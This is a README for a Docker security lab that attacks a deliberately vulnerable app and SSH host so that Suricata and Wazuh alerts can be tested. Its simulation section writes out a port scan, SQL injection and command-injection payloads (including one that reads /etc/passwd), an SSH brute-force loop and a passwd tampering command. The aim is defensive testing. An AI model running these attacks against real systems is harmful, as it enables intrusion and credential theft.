# Sentinel Mock Environment & Attack Simulation

A self-contained lab to exercise the Sentinel **Ingestion Service** with real
security tooling. It runs a deliberately vulnerable target inside Docker,
monitors it with **Suricata** (network IDS) and **Wazuh** (host IDS), and
forwards every detected alert to the Ingestion service, which validates,
normalizes and publishes it to a Redis queue.

```
               +------------------------------------------------------------+
   attacks     |  Docker Desktop (WSL2)                                     |
  -----------> |                                                            |
 (attacker)    |  172.20.0.0/24  (mocknet)                                  |
               |                                                            |
  nmap/hydra   |  +----------+    +----------+    +-------------------+    |
  --------------->|  DVWA    |    | Wazuh    |--->|  Wazuh Manager    |    |
  curl         |  | (target) |    | Agent    |    | (correlation)     |    |
               |  +----------+    | + sshd  |    +-------------------+    |
               |       |          +----------+          | custom-remote    |
               |       |   all traffic crosses mocknet  v (POST webhook)   |
               |       +-------------+--------------------------------+    |
               |                     | br-mocknet (captured)          |    |
               |          +----------+--------+                        |    |
               |          |  Suricata (NIDS)  |   eve.json forwarder    |    |
               |          +-------------------+   (POST webhook)        |    |
               |                                                        v    |
               |   +--------------------------------------------------------+ |
               |   |  Ingestion Service  (host, port 8080)   +  Redis queue  | |
               |   +--------------------------------------------------------+ |
               +--------------------------------------------------------------+
```

## Prerequisites

- **Docker Desktop 4.34+** (Windows/WSL2 backend) — the Suricata container uses
  host networking to sniff the Docker bridge, which requires this.
- **Node.js 18+** and **pnpm** (for the Ingestion service).
- ~4 GB free RAM (Wazuh manager alone uses 1-2 GB).

## 1. Start the Ingestion Service

```bash
cp .env.example .env   # single global env at the workspace root (vulcan.ai/.env)
pnpm install
pnpm --filter ingestion run dev
```

You should see:

```
[ingestion] listening on http://0.0.0.0:8080
[ingestion] publishing normalized alerts to Redis queue "alert.enrich"
```

## 2. Start the Mock Environment

```bash
cd infra/mock-environment
docker compose up --build -d
```

Wait for Wazuh to finish booting (30-60 s), then check everything is healthy:

```bash
docker compose ps
```

| Container              | Purpose                                                        |
| ---------------------- | -------------------------------------------------------------- |
| `sentinel-redis`       | Redis queue for normalized alerts                              |
| `sentinel-dvwa`        | Vulnerable web app (attack target)                             |
| `sentinel-suricata`    | Network IDS, captures all mocknet traffic                      |
| `sentinel-attacker`    | Toolbox: `nmap`, `hydra`, `sshpass`, `curl`                    |
| `sentinel-wazuh-manager` | Correlates agent events, forwards alerts to Ingestion        |
| `sentinel-wazuh-agent` | Monitored SSH target host (`victim:victim`) with Wazuh agent   |

> The Wazuh manager takes a while to boot and will log Filebeat/indexer
> connection errors — that is expected (there is no indexer in this lab) and
> harmless.

## 3. Simulate Attacks

All attack commands run inside the `attacker` container.

### 3.1 Network attack -> Suricata (port scan)

```bash
docker compose exec attacker nmap -sS -T4 dvwa
```

Suricata sees the SYN scan crossing the mocknet bridge and fires an alert that
the forwarder POSTs to Ingestion.

### 3.2 Network attack -> Suricata (web exploit against DVWA)

DVWA is on `http://localhost:8081` in your browser. From the attacker:

```bash
docker compose exec attacker curl -s "http://dvwa/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit"
docker compose exec attacker curl -s "http://dvwa/vulnerabilities/exec/?ip=127.0.0.1;cat%20/etc/passwd"
```

### 3.3 Host attack -> Wazuh (SSH brute force)

```bash
docker compose exec attacker hydra -l victim -P /usr/share/wordlists/rockyou.txt ssh://wazuh-agent
```

If `rockyou.txt` is not present (Alpine does not ship wordlists), use a small
inline list:

```bash
docker compose exec attacker sh -c '
for p in admin 123456 password hunter2 letmein qwerty victim; do
  sshpass -p "$p" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 victim@wazuh-agent true
done'
```

The agent reads `/var/log/auth.log`, the manager correlates repeated failures
(level 10) and forwards the alert to Ingestion.

### 3.4 Host attack -> Wazuh (file tampering / FIM)

```bash
docker compose exec wazuh-agent sh -c 'echo "pwned" >> /etc/passwd'
```

Wazuh's file integrity monitoring (syscheck) detects the change.

## 4. Verification

Watch the Ingestion service terminal — each alert is logged as it is validated,
normalized and published:

```
[ingestion] listening on http://0.0.0.0:8080
[ingestion] publishing normalized alerts to Redis queue "alert.enrich"
```

Check the queue from the host (BullMQ stores completed jobs in a sorted set):

```bash
docker exec sentinel-redis redis-cli zcard bull:alert.enrich:completed
docker exec sentinel-redis redis-cli zcard bull:alert.enrich:failed
```

(Expect `completed` to grow after each attack, `failed` to stay 0. To see the
actual jobs including the Worker's enrich + correlate output, watch the Worker
app - `pnpm --filter worker run dev`.)

Optional - query the Wazuh API to see the raw alerts (creds set in compose and
in the global env `WAZUH_API_*`):

```bash
curl -u admin:ChangeMe123! -k "https://localhost:55000/security/user/authenticate" -X POST
```

## Ports

| Port    | Service                          |
| ------- | -------------------------------- |
| 6379    | Redis                            |
| 8080    | Ingestion service (host)         |
| 8081    | DVWA web UI                      |
| 1514    | Wazuh agent comms (tcp/udp)      |
| 1515    | Wazuh agent registration         |
| 55000   | Wazuh API (`admin/ChangeMe123!`) |
| 2222    | SSH to the vulnerable host       |

## Troubleshooting

- **Suricata logs "falling back to eth0"** — the mocknet bridge was not found.
  Confirm host networking works (`docker run --rm --network host alpine ip a`)
  and that `MONITOR_SUBNET` matches the network subnet.
- **No alerts reaching Ingestion** — confirm Ingestion is running and reachable
  from containers: `docker compose exec suricata curl -s http://host.docker.internal:8080/health`.
- **Wazuh agent stuck "manager not ready"** — the manager needs ~30-60 s to
  start; the agent retries automatically for 2.5 minutes.
- **Change the API password** — update `API_PASSWORD` in
  `docker-compose.yml` **and** `WAZUH_API_PASSWORD` in the global
  `vulcan.ai/.env`.
- **DVWA fails to boot** — the classic image is old; the nmap/SSH demos do not
  depend on it, so the lab still works. You can skip DVWA entirely.
